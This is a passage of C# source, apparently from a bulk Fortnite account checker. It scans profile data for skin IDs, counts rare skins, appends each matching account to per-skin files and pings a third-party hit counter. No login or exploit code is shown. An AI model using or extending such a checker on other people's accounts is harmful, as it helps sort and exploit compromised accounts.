                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Brite Bomber ");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag18 = x.Contains("AthenaCharacter:cid_112_athena_commando_m_brite");
                            if (flag18)
                            {
                                sw.WriteLine("=> Brite Gunner");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Brite Gunner");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag19 = x.Contains("AthenaCharacter:cid_104_athena_commando_f_bunny");
                            if (flag19)
                            {
                                sw.WriteLine("=> Bunny Brawler");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Bunny Brawler");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag20 = x.Contains("AthenaCharacter:cid_094_athena_commando_m_rider");
                            if (flag20)
                            {
                                sw.WriteLine("=> Burnout");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Burnout");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag21 = x.Contains("AthenaCharacter:cid_115_athena_commando_m_carbideblue");
                            if (flag21)
                            {
                                sw.WriteLine("=> Carbide");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Carbide");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag22 = x.Contains("AthenaCharacter:cid_123_athena_commando_f_metal");
                            if (flag22)
                            {
                                sw.WriteLine("=> Chromium");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Chromium");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag23 = x.Contains("AthenaCharacter:cid_110_athena_commando_f_circuitbreaker");
                            if (flag23)
                            {
                                sw.WriteLine("=> Circuit Breaker");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Circuit Breaker");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag24 = x.Contains("AthenaCharacter:cid_151_athena_commando_f_soccergirld");
                            if (flag24)
                            {
                                sw.WriteLine("=> Clinical Crosser");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Clinical Crosser");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;

                            }
                            bool flag25 = x.Contains("AthenaCharacter:cid_051_athena_commando_m_holidayelf");
                            if (flag25)
                            {
                                sw.WriteLine("=> Codename E.L.F.");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Codename E.L.F.");
                                }
                                if (!DisableCounterStats.Checked)
                                {
                                    try
                                    {
                                        string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=37910540&digit=style/plain/1/&reloads=0");
                                    }
                                    catch
                                    {

                                    }
                                }
                                Interlocked.Increment(ref rareskins);
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                                if (CodenameELFSaveFile.Checked)
                                {
                                    using (StreamWriter CNelf = File.AppendText(CodenameELF))
                                    {
                                        CNelf.WriteLine(account);
                                    }
                                }
                            }
                            bool flag26 = x.Contains("AthenaCharacter:cid_016_athena_commando_f");
                            if (flag26)
                            {
                                sw.WriteLine("=> Commando");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Commando");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag27 = x.Contains("AthenaCharacter:cid_050_athena_commando_m_holidaynutcracker");
                            if (flag27)
                            {
                                sw.WriteLine("=> Crackshot");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Crackshot");
                                }
                                if (!DisableCounterStats.Checked)
                                {
                                    try
                                    {
                                        string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=37910540&digit=style/plain/1/&reloads=0");
                                    }
                                    catch
                                    {

                                    }
                                }
                                Interlocked.Increment(ref rareskins);
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                                if (CrackshotSaveFile.Checked)
                                {
                                    using (StreamWriter cshot = File.AppendText(Crackshot))
                                    {
                                        cshot.WriteLine(account);
                                    }
                                }
                            }
                            bool flag28 = x.Contains("AthenaCharacter:cid_069_athena_commando_f_pinkbear");
                            if (flag28)
                            {
                                sw.WriteLine("=> Cuddle Team Leader");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Cuddle Team Leader");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag29 = x.Contains("AthenaCharacter:cid_105_athena_commando_f_spaceblack");
                            if (flag29)
                            {
                                sw.WriteLine("=> Dark Vanguard");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dark Vanguard");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag30 = x.Contains("AthenaCharacter:cid_088_athena_commando_m_spaceblack");
                            if (flag30)
                            {
                                sw.WriteLine("=> Dark Voyager");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dark Voyager");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag31 = x.Contains("AthenaCharacter:cid_076_athena_commando_f_sup");
                            if (flag31)
                            {
                                sw.WriteLine("=> Dazzle");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dazzle");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag32 = x.Contains("AthenaCharacter:cid_040_athena_commando_m_district");
                            if (flag32)
                            {
                                sw.WriteLine("=> Devastator");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Devastator");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag33 = x.Contains("AthenaCharacter:cid_083_athena_commando_f_tactical");
                            if (flag33)
                            {
                                sw.WriteLine("=> Elite Agent");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Elite Agent");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag34 = x.Contains("AthenaCharacter:cid_143_athena_commando_f_darkninja");
                            if (flag34)
                            {
                                sw.WriteLine("=> Fate");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Fate");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag35 = x.Contains("AthenaCharacter:cid_132_athena_commando_m_venus");
                            if (flag35)
                            {
                                sw.WriteLine("=> Flytrap");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Flytrap");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag36 = x.Contains("AthenaCharacter:cid_038_athena_commando_m_disco");
                            if (flag36)
                            {
                                sw.WriteLine("=> Funk Ops");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Funk Ops");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag37 = x.Contains("AthenaCharacter:cid_029_athena_commando_f_halloween");
                            if (flag37)
                            {
                                sw.WriteLine("=> Ghoul Trooper");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Ghoul Trooper");
                                }
                                Interlocked.Increment(ref rareskins);
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                                if (GhoulTrooperSaveFile.Checked)
                                {
                                    using (StreamWriter gtrooper = File.AppendText(GhoulTrooper))
                                    {
                                        gtrooper.WriteLine(account);
                                    }
                                }
                            }
                            bool flag38 = x.Contains("AthenaCharacter:cid_048_athena_commando_f_holidaygingerbread");
                            if (flag38)
                            {
                                sw.WriteLine("=> Ginger Gunner");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Ginger Gunner");
                                }
                                if (!DisableCounterStats.Checked)
                                {
                                    try
                                    {
                                        string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=37910540&digit=style/plain/1/&reloads=0");
                                    }
                                    catch
                                    {

                                    }
                                }
                                if (GingerGunnerSaveFile.Checked)
                                {
                                    try
                                    {
                                        using (StreamWriter GingerLetsSave = File.AppendText(GGSave))
                                        {
                                            GingerLetsSave.WriteLine(account);
                                        }
                                    }
                                    catch(Exception ex)
                                    {
                                        MessageBox.Show(ex.Message);
                                    }
                                }
                                Interlocked.Increment(ref rareskins);
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag39 = x.Contains("AthenaCharacter:cid_155_athena_commando_f_gumshoe");
                            if (flag39)
                            {
                                sw.WriteLine("=> Gumshoe ");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Gumshoe ");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag40 = x.Contains("AthenaCharacter:cid_089_athena_commando_m_retrogrey");
                            if (flag40)
                            {
                                sw.WriteLine("=> Havoc");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Havoc");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag41 = x.Contains("AthenaCharacter:cid_099_athena_commando_f_scathach");
                            if (flag41)
                            {
                                sw.WriteLine("=> Highland Warrior");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Highland Warrior");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag42 = x.Contains("AthenaCharacter:cid_074_athena_commando_f_stripe");
                            if (flag42)
                            {
                                sw.WriteLine("=> Jungle Scout");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Jungle Scout");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag43 = x.Contains("AthenaCharacter:cid_108_athena_commando_m_fishhead");
                            if (flag43)
                            {
                                sw.WriteLine("=> Leviathan");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Leviathan");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag44 = x.Contains("AthenaCharacter:cid_126_athena_commando_m_auroraglow");
                            if (flag44)
                            {
                                sw.WriteLine("=> LiteShow");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> LiteShow");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag45 = x.Contains("AthenaCharacter:cid_070_athena_commando_m_cupid");
                            if (flag45)
                            {
                                sw.WriteLine("=> Love Ranger");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Love Ranger");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag46 = x.Contains("AthenaCharacter:cid_103_athena_commando_m_bunny");
                            if (flag46)
                            {
                                sw.WriteLine("=> Bunny Raider");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Bunny Raider");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag47 = x.Contains("AthenaCharacter:cid_049_athena_commando_m_holidaygingerbread");
                            if (flag47)
                            {
                                sw.WriteLine("=> Merry Marauder");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Merry Marauder");
                                }
                                if (!DisableCounterStats.Checked)
                                {
                                    try
                                    {
                                        string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=37910540&digit=style/plain/1/&reloads=0");
                                    }
                                    catch
                                    {

                                    }
                                }
                                Interlocked.Increment(ref rareskins);
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                                if (MerryMarauderSaveFile.Checked)
                                {
                                    using (StreamWriter mMarauder = File.AppendText(MerryMarauder))
                                    {
                                        mMarauder.WriteLine(account);
                                    }
                                }
                            }
                            bool flag48 = x.Contains("AthenaCharacter:cid_080_athena_commando_m_space");
                            if (flag48)
                            {
                                sw.WriteLine("=> Mission Specialist");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Mission Specialist");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag49 = x.Contains("AthenaCharacter:cid_081_athena_commando_f_space");
                            if (flag49)
                            {
                                sw.WriteLine("=> Moonwalker");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Moonwalker");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag50 = x.Contains("AthenaCharacter:cid_062_athena_commando_f_skigirl_usa");
                            if (flag50)
                            {
                                sw.WriteLine("=> Mogul Master (USA)");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Mogul Master (USA)");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag51 = x.Contains("AthenaCharacter:cid_023_athena_commando_f");
                            if (flag51)
                            {
                                sw.WriteLine("=> Munitions Expert");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Munitions Expert");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag52 = x.Contains("AthenaCharacter:cid_124_athena_commando_f_auroraglow");
                            if (flag52)
                            {
                                sw.WriteLine("=> NiteLite");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> NiteLite");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag53 = x.Contains("AthenaCharacter:cid_046_athena_commando_f_holidaysweater");
                            if (flag53)
                            {
                                sw.WriteLine("=> Nog Ops");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Nog Ops");
                                }
                                if (!DisableCounterStats.Checked)
                                {
                                    try
                                    {
                                        string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=37910540&digit=style/plain/1/&reloads=0");
                                    }
                                    catch
                                    {

                                    }
                                }
                                Interlocked.Increment(ref rareskins);
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                                if (NogOpsSaveFile.Checked)
                                {
                                    using (StreamWriter nops = File.AppendText(NogOps))
                                    {
                                        nops.WriteLine(account);
                                    }
                                }
                            }
                            bool flag54 = x.Contains("AthenaCharacter:cid_159_athena_commando_m_gumshoedark");
                            if (flag54)
                            {
                                sw.WriteLine("=> Noir");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Noir");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag55 = x.Contains("AthenaCharacter:cid_116_athena_commando_m_carbideblack");
                            if (flag55)
                            {
                                sw.WriteLine("=> Omega");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Omega");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag56 = x.Contains("AthenaCharacter:cid_141_athena_commando_m_darkeagle");
                            if (flag56)
                            {
                                sw.WriteLine("=> Omen");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Omen");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag57 = x.Contains("AthenaCharacter:cid_149_athena_commando_f_soccergirlb");
                            if (flag57)
                            {
                                sw.WriteLine("=> Poised Playmaker");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Poised Playmaker");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag58 = x.Contains("AthenaCharacter:cid_097_athena_commando_f_rockerpunk");
                            if (flag58)
                            {
                                sw.WriteLine("=> Power Chord");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Power Chord");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                if (PowerChordSaveFile.Checked)
                                {
                                    using (StreamWriter PowerChordS = File.AppendText(PowerChord))
                                    {
                                        PowerChordS.WriteLine(account);
                                    }
                                }
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag59 = x.Contains("AthenaCharacter:cid_091_athena_commando_m_redshirt");
                            if (flag59)
                            {
                                sw.WriteLine("=> Radiant Striker");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Radiant Striker");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag60 = x.Contains("AthenaCharacter:cid_135_athena_commando_f_jailbird");
                            if (flag60)
                            {
                                sw.WriteLine("=> Rapscallion");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rapscallion");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag61 = x.Contains("AthenaCharacter:cid_031_athena_commando_m_retro");
                            if (flag61)
                            {
                                sw.WriteLine("=> Raptor");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Raptor");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag62 = x.Contains("AthenaCharacter:cid_102_athena_commando_m_raven");
                            if (flag62)
                            {
                                sw.WriteLine("=> Raven");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Raven");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag63 = x.Contains("cid_022_athena_commando_f");
                            if (flag63)
                            {
                                sw.WriteLine("=> Recon Expert");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Recon Expert");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag64 = x.Contains("AthenaCharacter:cid_024_athena_commando_f");
                            if (flag64)
                            {
                                sw.WriteLine("=> Recon Specialist");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Recon Specialist");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag65 = x.Contains("AthenaCharacter:cid_034_athena_commando_f_medieval");
                            if (flag65)
                            {
                                sw.WriteLine("=> Red Knight");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Red Knight");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag66 = x.Contains("AthenaCharacter:cid_047_athena_commando_f_holidayreindeer");
                            if (flag66)
                            {
                                sw.WriteLine("=> Red Nosed Raider");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Red Nosed Raider");
                                }
                                if (!DisableCounterStats.Checked)
                                {
                                    try
                                    {
                                        string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=37910540&digit=style/plain/1/&reloads=0");
                                    }
                                    catch
                                    {

                                    }
                                }
                                Interlocked.Increment(ref rareskins);
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                                if (RedNosedRaiderSaveFile.Checked)
                                {
                                    using (StreamWriter rnRaider = File.AppendText(RedNosedRaider))
                                    {
                                        rnRaider.WriteLine(account);
                                    }
                                }
                            }
                            bool flag67 = x.Contains("AthenaCharacter:cid_013_athena_commando_f");
                            if (flag67)
                            {
                                sw.WriteLine("=> Renegade");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Renegade");
                                }
                                if (!DisableCounterStats.Checked)
                                {
                                    try
                                    {
                                        string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=37910540&digit=style/plain/1/&reloads=0");
                                    }
                                    catch
                                    {

                                    }
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag68 = x.Contains("AthenaCharacter:cid_028_athena_commando_f");
                            if (flag68)
                            {
                                sw.WriteLine("=> Renegade Raider");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Renegade Raider");
                                }
                                if (!DisableCounterStats.Checked)
                                {
                                    try
                                    {
                                        string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=37910540&digit=style/plain/1/&reloads=0");
                                    }
                                    catch
                                    {

                                    }
                                }
                                if (RenegadeSaveFile.Checked)
                                {
                                    using (StreamWriter RenegadeSkinS = File.AppendText(RenegadeSkin))
                                    {
                                        RenegadeSkinS.WriteLine(account);
                                    }
                                }
                                Interlocked.Increment(ref rareskins);
                                Interlocked.Increment(ref RenegadeCount);
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag69 = x.Contains("AthenaCharacter:cid_093_athena_commando_m_dinosaur");
                            if (flag69)
                            {
                                sw.WriteLine("=> Rex");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rex");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag70 = x.Contains("AthenaCharacter:cid_090_athena_commando_m_tactical");
                            if (flag70)
                            {
                                sw.WriteLine("=> Rogue Agent");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rogue Agent");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag71 = x.Contains("AthenaCharacter:cid_033_athena_commando_f_medieval");
                            if (flag71)
                            {
                                sw.WriteLine("=> Royale Knight");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Royale Knight");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag72 = x.Contains("AthenaCharacter:cid_082_athena_commando_m_scavenger");
                            if (flag72)
                            {
                                sw.WriteLine("=> Rust Lord");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rust Lord");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag73 = x.Contains("AthenaCharacter:cid_087_athena_commando_f_redsilk");
                            if (flag73)
                            {
                                sw.WriteLine("=> Scarlet Defender");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Scarlet Defender");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag74 = x.Contains("AthenaCharacter:cid_134_athena_commando_m_jailbird");
                            if (flag74)
                            {
                                sw.WriteLine("=> Scoundrel");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Scoundrel");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag75 = x.Contains("AthenaCharacter:cid_072_athena_commando_m_scout");
                            if (flag75)
                            {
                                sw.WriteLine("=> Sash Sergeant");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Sash Sergeant");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag76 = x.Contains("AthenaCharacter:cid_098_athena_commando_f_stpatty");
                            if (flag76)
                            {
                                sw.WriteLine("=> Sgt Green Clover");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Sgt Green Clover");
                                }
                                if (!DisableCounterStats.Checked)
                                {
                                    try
                                    {
                                        string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=37910540&digit=style/plain/1/&reloads=0");
                                    }
                                    catch
                                    {

                                    }
                                }
                                Interlocked.Increment(ref rareskins);
                                Interlocked.Increment(ref TotalSkinsChecked);
                                if (SgtGreenCloverSaveFile.Checked)
                                {
                                    using (StreamWriter SgtGreenCloverS = File.AppendText(SgtGreenClover))
                                    {
                                        SgtGreenCloverS.WriteLine(account);
                                    }
                                }
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag77 = x.Contains("AthenaCharacter:cid_043_athena_commando_f_stealth");
                            if (flag77)
                            {
                                sw.WriteLine("=> Shadow Ops");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Shadow Ops");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag78 = x.Contains("AthenaCharacter:cid_030_athena_commando_m_halloween");
                            if (flag78)
                            {
                                try
                                {
                                    JToken profile = JObject.Parse(x)["profileChanges"][0]["profile"];
                                    JToken items = profile["items"];
                                    foreach (JToken item in items.Children())
                                    {
                                        if (item.First["templateId"].ToString() == "AthenaCharacter:cid_030_athena_commando_m_halloween")
                                        {
                                            string OGSkullyOrNuh = item.First["attributes"].ToString();
                                            if (OGSkullyOrNuh.Contains("Mat1"))
                                            {
                                                Interlocked.Increment(ref rareskins);
                                                if (SkullTrooperSaveFile.Checked)
                                                {
                                                    using (StreamWriter OGstrooper = File.AppendText(OGSkullTrooper))
                                                    {
                                                        OGstrooper.WriteLine(account);
                                                    }
                                                }
                                                OGSkullCount = OGSkullCount + 1;
                                                tp1.SetToolTip(nsLabel3, "OG Skull Trooper Accounts: " + OGSkullCount + "\nNoob Skull Trooper Accounts: " + NoobySkullTrooperAccounts);
                                            }
                                            else if (!OGSkullyOrNuh.Contains("Mat1"))
                                            {
                                                NoobySkullTrooperAccounts = NoobySkullTrooperAccounts + 1;
                                                tp1.SetToolTip(nsLabel3, "OG Skull Trooper Accounts: " + OGSkullCount + "\nNoob Skull Trooper Accounts: " + NoobySkullTrooperAccounts);
                                                if (SkullTrooperSaveFile.Checked)
                                                {
                                                    using (StreamWriter NoOGstrooper = File.AppendText(NoneOGSkullTrooper))
                                                    {
                                                        NoOGstrooper.WriteLine(account);
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                                catch
                                {
                                    //RIP
                                }
                                sw.WriteLine("=> Skull Trooper");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Skull Trooper");
                                }
                                if (!DisableCounterStats.Checked)
                                {
                                    try
                                    {
                                        string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=37910540&digit=style/plain/1/&reloads=0");
                                    }
                                    catch
                                    {

                                    }
                                    try
                                    {
                                        string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=82633011&digit=style/plain/1/&reloads=0");
                                    }
                                    catch
                                    {

                                    }
                                }
                                Interlocked.Increment(ref Skully);
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag79 = x.Contains("AthenaCharacter:cid_142_athena_commando_m_wwiipilot");
                            if (flag79)
                            {
                                sw.WriteLine("=> Sky Stalker");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Sky Stalker");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag80 = x.Contains("AthenaCharacter:cid_073_athena_commando_f_scuba");
                            if (flag80)
                            {
                                sw.WriteLine("=> Snorkel Ops");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Snorkel Ops");
                                }
